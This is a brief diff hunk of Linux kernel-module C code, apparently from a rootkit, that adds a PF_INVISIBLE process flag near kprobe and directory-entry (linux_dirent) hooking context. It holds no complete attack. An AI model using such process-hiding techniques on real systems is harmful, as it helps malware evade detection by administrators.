@@ -23,6 +23,8 @@
 static struct kprobe kpp;
 bool isPHook = false;
 
+#define PF_INVISIBLE 0x10000000
+
 #include <linux/dirent.h>	/* struct dirent refers to directory entry. */
 
 struct linux_dirent {
